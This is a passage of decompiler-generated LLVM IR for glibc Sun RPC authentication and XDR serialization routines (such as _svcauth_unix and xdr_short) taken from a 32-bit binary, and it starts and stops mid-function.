  br label %dec_label_pc_8063635

dec_label_pc_80635f2:                             ; preds = %dec_label_pc_80635d0
  %v1_80635f2 = add i32 %v0_80635d5, 1
  br label %dec_label_pc_80635f3

dec_label_pc_80635f3:                             ; preds = %dec_label_pc_80635cc, %dec_label_pc_80635f2
  %storemerge = phi i32 [ 0, %dec_label_pc_80635cc ], [ %v1_80635f2, %dec_label_pc_80635f2 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v0_80635f3 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_80635f3, i32* %eax.global-to-local, align 4
  store i32 %v0_80635f3, i32* @esi, align 4
  %v1_80635fa = inttoptr i32 %v0_80635f3 to i32*
  %v2_80635fa = load i32, i32* %v1_80635fa, align 4
  store i32 %v2_80635fa, i32* %eax.global-to-local, align 4
  %v0_80635fc = load i32, i32* @ebx, align 4
  %v5_80635fe = icmp slt i32 %v0_80635fc, %v2_80635fa
  br i1 %v5_80635fe, label %dec_label_pc_80635d0, label %dec_label_pc_8063600

dec_label_pc_8063600:                             ; preds = %dec_label_pc_80635f3
  %v1_8063600 = add i32 %v2_80635fa, 1
  store i32 %v1_8063600, i32* %eax.global-to-local, align 4
  store i32 %v1_8063600, i32* %v1_80635fa, align 4
  %v0_8063603 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_8063603, i32* %eax.global-to-local, align 4
  store i32 %v0_8063603, i32* @ebx, align 4
  %v0_806360c = load i32, i32* @esi, align 4
  %v1_806360c = inttoptr i32 %v0_806360c to i32*
  %v2_806360c = load i32, i32* %v1_806360c, align 4
  %v2_806360e = mul i32 %v2_806360c, 8
  store i32 %v2_806360e, i32* %eax.global-to-local, align 4
  store i32 %v2_806360e, i32* %stack_var_-24, align 4
  %v1_8063612 = inttoptr i32 %v0_8063603 to i32*
  %v2_8063612 = load i32, i32* %v1_8063612, align 4
  store i32 %v2_8063612, i32* %stack_var_-28, align 4
  %v4_8063614 = inttoptr i32 %v2_8063612 to i32*
  %v5_8063614 = call i32 @realloc(i32* %v4_8063614, i32 %v2_806360e, i32 %v0_8063603, i32 %v0_8063603)
  store i32 %v5_8063614, i32* %eax.global-to-local, align 4
  %v1_806361c = load i32, i32* @ebx, align 4
  %v2_806361c = inttoptr i32 %v1_806361c to i32*
  store i32 %v5_8063614, i32* %v2_806361c, align 4
  %v0_806361e = load i32, i32* %eax.global-to-local, align 4
  %v1_8063620 = icmp eq i32 %v0_806361e, 0
  br i1 %v1_8063620, label %dec_label_pc_8063635, label %dec_label_pc_8063624

dec_label_pc_8063624:                             ; preds = %dec_label_pc_8063600
  %v0_8063624 = load i32, i32* @esi, align 4
  %v1_8063624 = inttoptr i32 %v0_8063624 to i32*
  %v2_8063624 = load i32, i32* %v1_8063624, align 4
  store i32 %v2_8063624, i32* %eax.global-to-local, align 4
  %v0_8063626 = load i32, i32* @edi, align 4
  %v3_8063626 = mul i32 %v2_8063624, 8
  %v4_8063626 = add i32 %v0_806361e, -8
  %v5_8063626 = add i32 %v4_8063626, %v3_8063626
  %v6_8063626 = inttoptr i32 %v5_8063626 to i32*
  store i32 %v0_8063626, i32* %v6_8063626, align 4
  %v0_806362a = load i32, i32* @esi, align 4
  %v1_806362a = inttoptr i32 %v0_806362a to i32*
  %v2_806362a = load i32, i32* %v1_806362a, align 4
  %v0_806362c = load i32, i32* @ebx, align 4
  %v1_806362c = inttoptr i32 %v0_806362c to i32*
  %v2_806362c = load i32, i32* %v1_806362c, align 4
  store i32 %v2_806362c, i32* %eax.global-to-local, align 4
  %v2_806362e = mul i32 %v2_806362a, 8
  %v3_806362e = add i32 %v2_806362e, -4
  %v4_806362e = add i32 %v3_806362e, %v2_806362c
  %v5_806362e = inttoptr i32 %v4_806362e to i16*
  store i16 195, i16* %v5_806362e, align 2
  br label %dec_label_pc_8063635

dec_label_pc_8063635:                             ; preds = %dec_label_pc_806359b, %dec_label_pc_8063600, %dec_label_pc_8063579, %dec_label_pc_80635e5, %dec_label_pc_8063624
  %v0_8063638 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8063638

; uselistorder directives
  uselistorder i32 %v2_806360e, { 2, 1, 0 }
  uselistorder i32 %v2_80635c0, { 1, 0 }
  uselistorder i32 %v0_80635be, { 1, 0 }
  uselistorder i32 %v1_80635ae, { 1, 0 }
  uselistorder i32 %v0_80635a0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8063581, { 2, 1, 0 }
  uselistorder i32* %stack_var_-24, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 2, 0, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 14, 0, 1, 2, 3, 4, 8, 5, 9, 6, 7, 10, 11, 12, 13, 15, 16, 17, 18 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 3, 2, 0, 1 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1022, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8063635, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_80635f3, { 1, 0 }
  uselistorder label %dec_label_pc_80635cc, { 1, 0 }
}

define i32 @_authenticate() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_806363d = load i32, i32* @ebx, align 4
  store i32 %v0_806363d, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_806364b = add i32 %tmp1, 12
  %v1_806364e = add i32 %tmp, 24
  %v3_8063653 = inttoptr i32 %v1_806364b to i16*
  %v4_8063653 = call i32 @memcpy(i16* %v3_8063653, i32 %v1_806364e, i32 12)
  %v1_8063658 = add i32 %tmp1, 28
  %v2_8063658 = inttoptr i32 %v1_8063658 to i32*
  %v3_8063658 = load i32, i32* %v2_8063658, align 4
  %v0_806365b = load i32, i32* @global_var_807ea20.795, align 32
  %v2_8063663 = add i32 %v3_8063658, 32
  %v3_8063663 = inttoptr i32 %v2_8063663 to i32*
  store i32 %v0_806365b, i32* %v3_8063663, align 4
  %v0_8063666 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063666 = add i32 %v0_8063666, 28
  %v2_8063666 = inttoptr i32 %v1_8063666 to i32*
  %v3_8063666 = load i32, i32* %v2_8063666, align 4
  %v1_8063669 = add i32 %v3_8063666, 40
  %v2_8063669 = inttoptr i32 %v1_8063669 to i32*
  store i32 0, i32* %v2_8063669, align 4
  %v0_8063670 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063670 = add i32 %v0_8063670, 12
  %v2_8063670 = inttoptr i32 %v1_8063670 to i32*
  %v3_8063670 = load i32, i32* %v2_8063670, align 4
  %v1_8063680 = mul i32 %v3_8063670, 4
  %v2_8063680 = add i32 %v1_8063680, ptrtoint (i32* @global_var_806e1f8.805 to i32)
  %v3_8063680 = inttoptr i32 %v2_8063680 to i32*
  %v4_8063680 = load i32, i32* %v3_8063680, align 4
  %v2_8063688 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063688, i32* %ebx.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_8063680)
  %v2_8063691 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063691, i32* @edx, align 4
  store i32 %v2_8063688, i32* @ebx, align 4
  ret i32 2

; uselistorder directives
  uselistorder i32 %tmp1, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806369f = load i32, i32* @edi, align 4
  %v0_80636a1 = load i32, i32* @ebx, align 4
  store i32 %v0_80636a1, i32* %stack_var_-16, align 4
  %v1_80636a9 = add i32 %arg2, 24
  %v2_80636a9 = inttoptr i32 %v1_80636a9 to i32*
  %v3_80636a9 = load i32, i32* %v2_80636a9, align 4
  store i32 %v3_80636a9, i32* @edi, align 4
  %v1_80636ac = add i32 %v3_80636a9, 24
  %v2_80636af = add i32 %v3_80636a9, 4
  %v3_80636af = inttoptr i32 %v2_80636af to i32*
  store i32 %v1_80636ac, i32* %v3_80636af, align 4
  %v0_80636b2 = load i32, i32* @edi, align 4
  %v1_80636b2 = add i32 %v0_80636b2, 280
  %v2_80636b8 = add i32 %v0_80636b2, 20
  %v3_80636b8 = inttoptr i32 %v2_80636b8 to i32*
  store i32 %v1_80636b2, i32* %v3_80636b8, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_80636bf = add i32 %arg3, 32
  %v2_80636bf = inttoptr i32 %v1_80636bf to i32*
  %v3_80636bf = load i32, i32* %v2_80636bf, align 4
  store i32 %v3_80636bf, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_80636cd = add i32 %arg3, 28
  %v2_80636cd = inttoptr i32 %v1_80636cd to i32*
  %v3_80636cd = load i32, i32* %v2_80636cd, align 4
  %v2_80636d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_80636d0, i32* @ebx, align 4
  %v5_80636d5 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v3_80636cd, i32 %v3_80636bf, i32 1)
  store i32 %v2_80636d0, i32* @esi, align 4
  store i32 %v3_80636cd, i32* @ebp, align 4
  store i32 %tmp7, i32* @eax, align 4
  %v7_80636e5 = add i32 %tmp7, 24
  %v8_80636e5 = inttoptr i32 %v7_80636e5 to i32*
  %v9_80636e5 = load i32, i32* %v8_80636e5, align 4
  call void @__pseudo_call(i32 %v9_80636e5)
  store i32 %tmp7, i32* %edx.global-to-local, align 4
  %v1_80636ed = icmp eq i32 %tmp7, 0
  br i1 %v1_80636ed, label %dec_label_pc_8063782, label %dec_label_pc_80636f5

dec_label_pc_80636f5:                             ; preds = %entry
  %v1_80636f5 = inttoptr i32 %tmp7 to i32*
  %v2_80636f5 = load i32, i32* %v1_80636f5, align 4
  %v1_80636f7 = call i32 @llvm.bswap.i32(i32 %v2_80636f5)
  %v1_80636f9 = load i32, i32* @edi, align 4
  %v2_80636f9 = inttoptr i32 %v1_80636f9 to i32*
  store i32 %v1_80636f7, i32* %v2_80636f9, align 4
  %v0_80636fb = load i32, i32* %edx.global-to-local, align 4
  %v1_80636fb = add i32 %v0_80636fb, 4
  %v2_80636fb = inttoptr i32 %v1_80636fb to i32*
  %v3_80636fb = load i32, i32* %v2_80636fb, align 4
  %v1_80636fe = call i32 @llvm.bswap.i32(i32 %v3_80636fb)
  store i32 %v1_80636fe, i32* @esi, align 4
  %v6_8063706 = icmp ugt i32 %v1_80636fe, 255
  br i1 %v6_8063706, label %dec_label_pc_80637ff, label %dec_label_pc_806370c

dec_label_pc_806370c:                             ; preds = %dec_label_pc_80636f5
  %v1_806370c = add i32 %v0_80636fb, 8
  store i32 %v1_806370c, i32* %ebx.global-to-local, align 4
  %v0_8063712 = load i32, i32* @edi, align 4
  %v1_8063712 = add i32 %v0_8063712, 4
  %v2_8063712 = inttoptr i32 %v1_8063712 to i32*
  %v3_8063712 = load i32, i32* %v2_8063712, align 4
  %v1_8063715 = add i32 %v1_80636fe, 3
  store i32 %v1_8063715, i32* %ebp.global-to-local, align 4
  %tmp25 = inttoptr i32 %v3_8063712 to i16*
  %v5_8063718 = call i32 @memcpy(i16* %tmp25, i32 %v1_806370c, i32 %v1_80636fe)
  %v1_806371d = and i32 %v1_8063715, -4
  store i32 %v1_806371d, i32* %ebp.global-to-local, align 4
  %v0_8063720 = load i32, i32* @edi, align 4
  %v1_8063720 = add i32 %v0_8063720, 4
  %v2_8063720 = inttoptr i32 %v1_8063720 to i32*
  %v3_8063720 = load i32, i32* %v2_8063720, align 4
  %v0_8063726 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8063726 = add i32 %v0_8063726, %v1_806371d
  store i32 %v2_8063726, i32* %edx.global-to-local, align 4
  %v2_8063729 = add i32 %v3_8063720, %v1_80636fe
  %v3_8063729 = inttoptr i32 %v2_8063729 to i8*
  store i8 0, i8* %v3_8063729, align 1
  %v0_806372d = load i32, i32* %edx.global-to-local, align 4
  %v1_806372d = inttoptr i32 %v0_806372d to i32*
  %v2_806372d = load i32, i32* %v1_806372d, align 4
  %v1_806372f = call i32 @llvm.bswap.i32(i32 %v2_806372d)
  %v1_8063731 = load i32, i32* @edi, align 4
  %v2_8063731 = add i32 %v1_8063731, 8
  %v3_8063731 = inttoptr i32 %v2_8063731 to i32*
  store i32 %v1_806372f, i32* %v3_8063731, align 4
  %v0_8063734 = load i32, i32* %edx.global-to-local, align 4
  %v1_8063734 = add i32 %v0_8063734, 4
  %v2_8063734 = inttoptr i32 %v1_8063734 to i32*
  %v3_8063734 = load i32, i32* %v2_8063734, align 4
  %v1_8063737 = call i32 @llvm.bswap.i32(i32 %v3_8063734)
  %v1_8063739 = load i32, i32* @edi, align 4
  %v2_8063739 = add i32 %v1_8063739, 12
  %v3_8063739 = inttoptr i32 %v2_8063739 to i32*
  store i32 %v1_8063737, i32* %v3_8063739, align 4
  %v0_806373c = load i32, i32* %edx.global-to-local, align 4
  %v1_806373c = add i32 %v0_806373c, 8
  %v2_806373c = inttoptr i32 %v1_806373c to i32*
  %v3_806373c = load i32, i32* %v2_806373c, align 4
  %v1_806373f = call i32 @llvm.bswap.i32(i32 %v3_806373c)
  store i32 %v1_806373f, i32* %ecx.global-to-local, align 4
  %v6_8063744 = icmp ugt i32 %v1_806373f, 16
  br i1 %v6_8063744, label %dec_label_pc_80637ff, label %dec_label_pc_806374a

dec_label_pc_806374a:                             ; preds = %dec_label_pc_806370c
  %v1_806374a = add i32 %v0_806373c, 12
  store i32 %v1_806374a, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_806374f = load i32, i32* @edi, align 4
  %v2_806374f = add i32 %v1_806374f, 16
  %v3_806374f = inttoptr i32 %v2_806374f to i32*
  store i32 %v1_806373f, i32* %v3_806374f, align 4
  %v0_8063762.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_806376228 = icmp ult i32 %v0_8063762.pre, %v1_806373f
  br i1 %v7_806376228, label %dec_label_pc_8063754, label %dec_label_pc_8063766

dec_label_pc_8063754:                             ; preds = %dec_label_pc_806374a, %dec_label_pc_8063754
  %v2_806375e29 = phi i32 [ %v1_8063761, %dec_label_pc_8063754 ], [ %v0_8063762.pre, %dec_label_pc_806374a ]
  %v0_8063754 = load i32, i32* @edi, align 4
  %v1_8063754 = add i32 %v0_8063754, 20
  %v2_8063754 = inttoptr i32 %v1_8063754 to i32*
  %v3_8063754 = load i32, i32* %v2_8063754, align 4
  store i32 %v3_8063754, i32* %edx.global-to-local, align 4
  %v0_8063757 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063757 = inttoptr i32 %v0_8063757 to i32*
  %v2_8063757 = load i32, i32* %v1_8063757, align 4
  %v1_8063759 = add i32 %v0_8063757, 4
  store i32 %v1_8063759, i32* %ebx.global-to-local, align 4
  %v1_806375c = call i32 @llvm.bswap.i32(i32 %v2_8063757)
  %v3_806375e = mul i32 %v2_806375e29, 4
  %v4_806375e = add i32 %v3_8063754, %v3_806375e
  %v5_806375e = inttoptr i32 %v4_806375e to i32*
  store i32 %v1_806375c, i32* %v5_806375e, align 4
  %v0_8063761 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063761 = add i32 %v0_8063761, 1
  store i32 %v1_8063761, i32* %esi.global-to-local, align 4
  %v7_8063762 = icmp ult i32 %v1_8063761, %v1_806373f
  br i1 %v7_8063762, label %dec_label_pc_8063754, label %dec_label_pc_8063766

dec_label_pc_8063766:                             ; preds = %dec_label_pc_8063754, %dec_label_pc_806374a
  %v0_8063766 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8063766 = mul i32 %v1_806373f, 4
  %v3_8063766 = add i32 %v2_8063766, 20
  %v4_8063766 = add i32 %v3_8063766, %v0_8063766
  %tmp = icmp ugt i32 %v4_8063766, %tmp6
  br i1 %tmp, label %dec_label_pc_8063770, label %dec_label_pc_80637ad

dec_label_pc_8063770:                             ; preds = %dec_label_pc_8063766
  %v6_806377b = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_806e204.806, i32 0, i32 0), i32 %v1_806373f, i32 %v0_8063766, i32 %tmp6)
  br label %dec_label_pc_80637a3

dec_label_pc_8063782:                             ; preds = %entry
  %v0_8063784 = load i32, i32* @edi, align 4
  %v6_8063786 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_8063784, i32 0, i32 0)
  store i32 %v6_8063786, i32* @eax, align 4
  %v1_806378e = icmp eq i32 %v6_8063786, 0
  %v1_8063790 = icmp eq i1 %v1_806378e, false
  br i1 %v1_8063790, label %dec_label_pc_80637ad, label %dec_label_pc_8063792

dec_label_pc_8063792:                             ; preds = %dec_label_pc_8063782
  %v0_806379c = load i32, i32* @edi, align 4
  %v6_806379e = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_806379c, i32 %v6_8063786, i32 %v6_8063786)
  br label %dec_label_pc_80637a3

dec_label_pc_80637a3:                             ; preds = %dec_label_pc_8063770, %dec_label_pc_8063792
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063804

dec_label_pc_80637ad:                             ; preds = %dec_label_pc_8063766, %dec_label_pc_8063782
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80637b5 = add i32 %arg2, 44
  %v2_80637b5 = inttoptr i32 %v1_80637b5 to i32*
  %v3_80637b5 = load i32, i32* %v2_80637b5, align 4
  %v4_80637b5 = icmp eq i32 %v3_80637b5, 0
  %v1_80637b9 = add i32 %arg1, 28
  %v2_80637b9 = inttoptr i32 %v1_80637b9 to i32*
  %v3_80637b9 = load i32, i32* %v2_80637b9, align 4
  store i32 %v3_80637b9, i32* %edx.global-to-local, align 4
  br i1 %v4_80637b5, label %dec_label_pc_80637e6, label %dec_label_pc_80637be

dec_label_pc_80637be:                             ; preds = %dec_label_pc_80637ad
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v1_80637c0 = add i32 %arg2, 36
  %v2_80637c0 = inttoptr i32 %v1_80637c0 to i32*
  %v3_80637c0 = load i32, i32* %v2_80637c0, align 4
  %v2_80637c3 = add i32 %v3_80637b9, 32
  %v3_80637c3 = inttoptr i32 %v2_80637c3 to i32*
  store i32 %v3_80637c0, i32* %v3_80637c3, align 4
  %v3_80637ca = load i32, i32* %v2_80637b9, align 4
  store i32 %v3_80637ca, i32* %edx.global-to-local, align 4
  %v0_80637cd = load i32, i32* %ecx.global-to-local, align 4
  %v1_80637cd = add i32 %v0_80637cd, 40
  %v2_80637cd = inttoptr i32 %v1_80637cd to i32*
  %v3_80637cd = load i32, i32* %v2_80637cd, align 4
  %v2_80637d0 = add i32 %v3_80637ca, 36
  %v3_80637d0 = inttoptr i32 %v2_80637d0 to i32*
  store i32 %v3_80637cd, i32* %v3_80637d0, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v3_80637d7 = load i32, i32* %v2_80637b9, align 4
  store i32 %v3_80637d7, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v3_80637de = load i32, i32* %v2_80637b5, align 4
  %v2_80637e1 = add i32 %v3_80637d7, 40
  %v3_80637e1 = inttoptr i32 %v2_80637e1 to i32*
  store i32 %v3_80637de, i32* %v3_80637e1, align 4
  br label %dec_label_pc_80637fb

dec_label_pc_80637e6:                             ; preds = %dec_label_pc_80637ad
  %v1_80637e6 = add i32 %v3_80637b9, 32
  %v2_80637e6 = inttoptr i32 %v1_80637e6 to i32*
  store i32 0, i32* %v2_80637e6, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v3_80637f1 = load i32, i32* %v2_80637b9, align 4
  %v1_80637f4 = add i32 %v3_80637f1, 40
  %v2_80637f4 = inttoptr i32 %v1_80637f4 to i32*
  store i32 0, i32* %v2_80637f4, align 4
  br label %dec_label_pc_80637fb

dec_label_pc_80637fb:                             ; preds = %dec_label_pc_80637be, %dec_label_pc_80637e6
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063804

dec_label_pc_80637ff:                             ; preds = %dec_label_pc_806370c, %dec_label_pc_80636f5
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063804

dec_label_pc_8063804:                             ; preds = %dec_label_pc_80637fb, %dec_label_pc_80637a3, %dec_label_pc_80637ff
  %v0_806381f5 = phi i32 [ 0, %dec_label_pc_80637fb ], [ 1, %dec_label_pc_80637a3 ], [ 1, %dec_label_pc_80637ff ]
  %v3_8063804 = load i32, i32* %stack_var_-40, align 4
  %v1_8063808 = add i32 %v3_8063804, 28
  %v2_8063808 = inttoptr i32 %v1_8063808 to i32*
  %v3_8063808 = load i32, i32* %v2_8063808, align 4
  store i32 %v3_8063808, i32* %edx.global-to-local, align 4
  %v1_806380b = icmp eq i32 %v3_8063808, 0
  br i1 %v1_806380b, label %dec_label_pc_806381c, label %dec_label_pc_806380f

dec_label_pc_806380f:                             ; preds = %dec_label_pc_8063804
  call void @__pseudo_call(i32 %v3_8063808)
  %v0_806381f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806381c

dec_label_pc_806381c:                             ; preds = %dec_label_pc_8063804, %dec_label_pc_806380f
  %v0_806381f = phi i32 [ %v0_806381f.pre, %dec_label_pc_806380f ], [ %v0_806381f5, %dec_label_pc_8063804 ]
  %v2_8063822 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8063822, i32* %esi.global-to-local, align 4
  store i32 %v0_806369f, i32* %ebp.global-to-local, align 4
  ret i32 %v0_806381f

; uselistorder directives
  uselistorder i32 %v3_80637b9, { 1, 0, 2 }
  uselistorder i32* %v2_80637b9, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8063761, { 1, 2, 0 }
  uselistorder i32 %v1_806373f, { 1, 4, 3, 0, 2, 5, 6 }
  uselistorder i32* %stack_var_-40, { 3, 0, 1, 2, 4 }
  uselistorder i32 %tmp7, { 0, 2, 1, 4, 3 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_806381c, { 1, 0 }
  uselistorder label %dec_label_pc_8063804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80637fb, { 1, 0 }
  uselistorder label %dec_label_pc_80637ad, { 1, 0 }
  uselistorder label %dec_label_pc_80637a3, { 1, 0 }
  uselistorder label %dec_label_pc_8063754, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 2, i32* %stack_var_-24, align 4
  %v2_8063837 = ptrtoint i32* %stack_var_-24 to i32
  %v1_806383c = call i32 @unknown_0(i32 %v2_8063837)
  ret i32 %v1_806383c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 4, 3, 2, 1, 0 }
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_8063852 = inttoptr i32 %tmp2 to i32*
  %v2_8063852 = load i32, i32* %v1_8063852, align 4
  store i32 %v2_8063852, i32* %eax.global-to-local, align 4
  %v1_8063854 = icmp eq i32 %v2_8063852, 0
  %v1_8063856 = icmp eq i1 %v1_8063854, false
  br i1 %v1_8063856, label %dec_label_pc_8063860, label %dec_label_pc_8063858

dec_label_pc_8063858:                             ; preds = %entry
  %v1_8063858 = add i32 %tmp2, 4
  %v2_8063858 = inttoptr i32 %v1_8063858 to i32*
  %v3_8063858 = load i32, i32* %v2_8063858, align 4
  store i32 %v3_8063858, i32* %eax.global-to-local, align 4
  %v1_806385b = add i32 %v3_8063858, 4
  br label %dec_label_pc_8063872

dec_label_pc_8063860:                             ; preds = %entry
  %v9_8063860 = icmp eq i32 %v2_8063852, 1
  %v1_8063863 = icmp eq i1 %v9_8063860, false
  br i1 %v1_8063863, label %dec_label_pc_8063874, label %dec_label_pc_8063865

dec_label_pc_8063865:                             ; preds = %dec_label_pc_8063860
  %v1_8063865 = add i32 %tmp2, 4
  %v2_8063865 = inttoptr i32 %v1_8063865 to i32*
  %v3_8063865 = load i32, i32* %v2_8063865, align 4
  store i32 %v3_8063865, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063872

dec_label_pc_8063872:                             ; preds = %dec_label_pc_8063858, %dec_label_pc_8063865
  %storemerge.in.in = phi i32 [ %v1_806385b, %dec_label_pc_8063858 ], [ %v3_8063865, %dec_label_pc_8063865 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %storemerge)
  %v0_8063874.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063874

dec_label_pc_8063874:                             ; preds = %dec_label_pc_8063860, %dec_label_pc_8063872
  %v0_8063874 = phi i32 [ %v2_8063852, %dec_label_pc_8063860 ], [ %v0_8063874.pre, %dec_label_pc_8063872 ]
  %v9_8063874 = icmp eq i32 %v0_8063874, 2
  %v1_8063877 = zext i1 %v9_8063874 to i32
  store i32 %v1_8063877, i32* %eax.global-to-local, align 4
  ret i32 %v1_8063877

; uselistorder directives
  uselistorder i32 %v2_8063852, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8063874, { 1, 0 }
  uselistorder label %dec_label_pc_8063872, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_806388a = load i32, i32* %arg1, align 4
  %v9_806388c = icmp eq i32 %v2_806388a, 1
  br i1 %v9_806388c, label %dec_label_pc_80638b9, label %dec_label_pc_8063891

dec_label_pc_8063891:                             ; preds = %entry
  %v5_806388c = icmp eq i32 %v2_806388a, 0
  br i1 %v5_806388c, label %dec_label_pc_806389f, label %dec_label_pc_8063893

dec_label_pc_8063893:                             ; preds = %dec_label_pc_8063891
  %v9_8063898 = icmp eq i32 %v2_806388a, 2
  br i1 %v9_8063898, label %dec_label_pc_80638dd, label %dec_label_pc_80638db

dec_label_pc_806389f:                             ; preds = %dec_label_pc_8063891
  %v1_806389f = inttoptr i32 %arg2 to i16*
  %v2_806389f = load i16, i16* %v1_806389f, align 2
  %v3_806389f = sext i16 %v2_806389f to i32
  store i32 %v3_806389f, i32* %stack_var_-8, align 4
  %v1_80638a8 = add i32 %tmp8, 4
  %v2_80638a8 = inttoptr i32 %v1_80638a8 to i32*
  %v3_80638a8 = load i32, i32* %v2_80638a8, align 4
  %v2_80638ab = ptrtoint i32* %stack_var_-8 to i32
  %v5_80638b1 = add i32 %v3_80638a8, 4
  %v6_80638b1 = inttoptr i32 %v5_80638b1 to i32*
  %v7_80638b1 = load i32, i32* %v6_80638b1, align 4
  call void @__pseudo_call(i32 %v7_80638b1)
  br label %dec_label_pc_80638dd

dec_label_pc_80638b9:                             ; preds = %entry
  %v1_80638bb = add i32 %tmp8, 4
  %v2_80638bb = inttoptr i32 %v1_80638bb to i32*
  %v3_80638bb = load i32, i32* %v2_80638bb, align 4
  %v5_80638c4 = inttoptr i32 %v3_80638bb to i32*
  %v6_80638c4 = load i32, i32* %v5_80638c4, align 4
  call void @__pseudo_call(i32 %v6_80638c4)
  %v1_80638c9 = icmp eq i32 %v3_80638bb, 0
  br i1 %v1_80638c9, label %dec_label_pc_80638db, label %dec_label_pc_80638cd

dec_label_pc_80638cd:                             ; preds = %dec_label_pc_80638b9
  %v2_80638d1 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80638d1 = inttoptr i32 %v2_80638d1 to i16*
  br label %dec_label_pc_80638dd

dec_label_pc_80638db:                             ; preds = %dec_label_pc_8063893, %dec_label_pc_80638b9
  br label %dec_label_pc_80638dd

dec_label_pc_80638dd:                             ; preds = %dec_label_pc_8063893, %dec_label_pc_80638cd, %dec_label_pc_806389f, %dec_label_pc_80638db
